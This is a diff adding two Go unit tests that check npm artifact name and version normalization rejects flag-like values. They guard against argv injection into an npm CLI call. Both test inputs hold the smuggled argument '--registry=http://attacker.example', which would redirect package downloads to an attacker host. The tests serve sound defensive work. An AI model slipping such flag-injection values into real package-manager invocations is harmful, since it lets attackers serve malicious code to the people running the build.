@@ -218,6 +218,27 @@ func Test_NormalizeArtifactIdentity_NPM(t *testing.T) {
 				Version:   "1.0.0",
 			},
 		},
+		{
+			// Guards against argv/flag injection into the npm CLI invocation
+			// in dependency_graph_worker.go, which concatenates Name and
+			// Version into a single "name@version" positional argument.
+			name: "name resembling a flag returns error",
+			input: ArtifactIdentity{
+				Ecosystem: EcosystemNPM,
+				Name:      "--registry=http://attacker.example",
+				Version:   "1.0.0",
+			},
+			wantErr: true,
+		},
+		{
+			name: "version resembling a flag returns error",
+			input: ArtifactIdentity{
+				Ecosystem: EcosystemNPM,
+				Name:      "express",
+				Version:   "--registry=http://attacker.example",
+			},
+			wantErr: true,
+		},
 	}
 
 	for _, tc := range tests {
